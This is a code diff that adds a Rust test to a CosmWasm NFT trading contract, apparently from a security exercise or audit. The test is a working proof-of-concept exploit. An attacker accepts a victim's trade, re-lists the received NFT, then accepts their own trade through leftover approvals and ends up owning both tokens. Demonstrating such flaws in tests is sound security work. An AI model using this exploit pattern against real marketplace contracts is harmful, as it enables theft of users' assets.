@@ -448,4 +448,132 @@ pub mod tests {
             .unwrap();
         assert_eq!(owner_of.owner, USER1.to_string());
     }
+
+    const VICTIM: &str = "victim";
+    const NFT_VICTIM: &str = "victim's awesome nftj";
+
+    // USER1 can be the hacker here for trade-able sale
+    #[test]
+    fn exploit_sales_invariant_violation() { 
+        // USER1 has NFT1 as a tradeable sale
+        // USER2 has NFT2 as a non-tradeable sale
+        let (mut app, contract_addr, token_addr) = base_scenario();
+
+        // Minting NFT_VICTIM to Victim
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
+                token_id: NFT_VICTIM.to_string(),
+                owner: VICTIM.to_string(),
+                token_uri: Some("https://www.oaksecurity.io".to_string()),
+                extension: Empty::default(),
+            },
+            &[],
+        ).unwrap();
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(VICTIM),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT_VICTIM.to_string(),
+                expires: None,
+            },
+            &[],
+        ).unwrap(); 
+        // victim offers to trade NFT_VICTIM to USER1 for NFT1
+        app.execute_contract(
+            Addr::unchecked(VICTIM),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT1.to_string(),
+                offered: NFT_VICTIM.to_string(),
+            },
+            &[],
+        ).unwrap(); 
+
+        // EXPLOIT: USER1 can accept the trade and get NFT_VICTIM,
+        // then uses the same NFT to get their original NFT back
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptTrade {
+                id: NFT1.to_string(),
+                trader: VICTIM.to_string(),
+            },
+            &[],
+        ).unwrap();
+        // USER1 approves their newly owned NFT_VICTIM
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT_VICTIM.to_string(),
+                expires: None,
+            },
+            &[],
+        ).unwrap(); 
+        // USER1 offers NFT_VICTIM for their own NFT back
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT1.to_string(),
+                offered: NFT_VICTIM.to_string(),
+            },
+            &[],
+        ).unwrap(); 
+        // Victim participates in marketplace and wants to trade 
+        // NFT_1 for a new trade-able NFT. They approve transfer permissions
+        app.execute_contract(
+            Addr::unchecked(VICTIM),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        ).unwrap();
+        
+        // EXPLOIT: USER1 can successfully accept their own SALE and 
+        // get NFT back because of permissions
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptTrade {
+                id: NFT1.to_string(),
+                trader: USER1.to_string(),
+            },
+            &[],
+        ).unwrap();  
+
+        // USER1 owns both NFT1 and NFT_VICTIM for free 
+        // Gets back NFT1
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr.clone(),
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT1.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER1.to_string());
+        // And owns NFT_VICTIM
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr,
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT_VICTIM.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER1.to_string());
+    }
 }
